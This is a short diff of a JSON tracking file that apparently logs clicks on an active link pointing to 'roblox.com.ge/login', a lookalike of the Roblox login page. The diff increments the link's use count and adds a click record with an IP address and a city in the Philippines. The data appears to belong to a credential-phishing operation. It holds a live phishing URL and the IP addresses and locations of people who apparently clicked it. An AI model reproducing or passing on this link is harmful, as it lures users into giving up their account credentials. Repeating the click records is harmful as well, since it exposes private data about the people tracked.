@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1206,
+    "useCount": 1207,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9790,6 +9790,14 @@
         "ip": "119.93.69.122",
         "country": "Philippines",
         "city": "Makati City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777311004652,
+        "ip": "119.92.233.198",
+        "country": "Philippines",
+        "city": "Calamba",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
